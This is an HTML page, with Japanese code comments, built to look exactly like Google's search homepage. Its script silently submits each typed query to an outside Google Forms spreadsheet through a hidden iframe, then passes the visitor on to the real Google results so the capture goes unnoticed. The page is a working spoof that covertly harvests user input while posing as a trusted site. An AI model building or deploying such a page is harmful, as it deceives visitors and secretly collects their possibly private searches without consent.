<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        /* Googleの見た目を再現 */
        body {
            font-family: arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 15vh;
            margin: 0;
            background: white;
        }
        .logo {
            font-size: 80px;
            font-weight: bold;
            margin-bottom: 30px;
            user-select: none;
            cursor: default;
        }
        .g { color: #4285F4; } .o1 { color: #EA4335; } .o2 { color: #FBBC05; }
        .g2 { color: #4285F4; } .l { color: #34A853; } .e { color: #EA4335; }
        
        .search-container {
            width: 90%;
            max-width: 584px;
        }
        .search-box {
            display: flex;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            padding: 5px 15px;
            transition: box-shadow 0.2s;
        }
        .search-box:hover, .search-box:focus-within {
            box-shadow: 0 1px 6px rgba(32,33,36,.28);
            border-color: rgba(223,225,229,0);
        }
        input[type="text"] {
            flex-grow: 1;
            height: 34px;
            font-size: 16px;
            border: none;
            outline: none;
            background: transparent;
        }
        
        .buttons {
            margin-top: 25px;
            text-align: center;
        }
        button {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-size: 14px;
            margin: 11px 4px;
            padding: 0 16px;
            line-height: 36px;
            cursor: pointer;
        }
        button:hover {
            border: 1px solid #dadce1;
            box-shadow: 0 1px 1px rgba(0,0,0,.1);
            color: #202124;
        }
    </style>
</head>
<body>

    <div class="logo">
        <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
    </div>
    
    <div class="search-container">
        <form id="google_form" action="https://docs.google.com/forms/d/e/1FAIpQLSc4dSrv91dw8S6jdm5r-m9cUZbbknoK-8f8Nc8slsp0hTiRhw/formResponse" 
              method="POST" 
              target="hidden_iframe">
            
            <div class="search-box">
                <input type="text" name="entry.2003126825" id="search_query" autofocus autocomplete="off">
            </div>

            <div class="buttons">
                <button type="button" onclick="handleSearch('search')">Google 検索</button>
                <button type="button" onclick="handleSearch('lucky')">I'm Feeling Lucky</button>
            </div>
        </form>
    </div>

    <iframe name="hidden_iframe" style="display:none;"></iframe>

<script>
        // 1. 検索・転送のメイン処理
        function handleSearch(type) {
            const form = document.getElementById('google_form');
            const query = document.getElementById('search_query').value;

            // 文字が入っている場合は、スプレッドシートに送信
            if (query.trim() !== "") {
                form.submit();
            }

            // 0.5秒後に転送処理を開始
            setTimeout(function() {
                if (type === 'lucky' && query.trim() === "") {
                    window.location.href = "https://www.google.com/doodles";
                } else if (query.trim() !== "") {
                    window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(query);
                }
            }, 500);
        }

        // 2. エンターキーの判定処理
        const inputField = document.getElementById('search_query');
        
        inputField.addEventListener('keydown', function(event) {
            // event.isComposing が true の間は「変換中」
            if (event.isComposing || event.keyCode === 229) {
                return; // 変換中は何もしない
            }

            // 変換中でない時にエンター（Enter）が押されたら検索実行
            if (event.key === 'Enter') {
                event.preventDefault(); // 本来のフォーム送信を止める
                handleSearch('search'); // 検索処理を呼び出す
            }
        });
    </script>

</body>
</html>
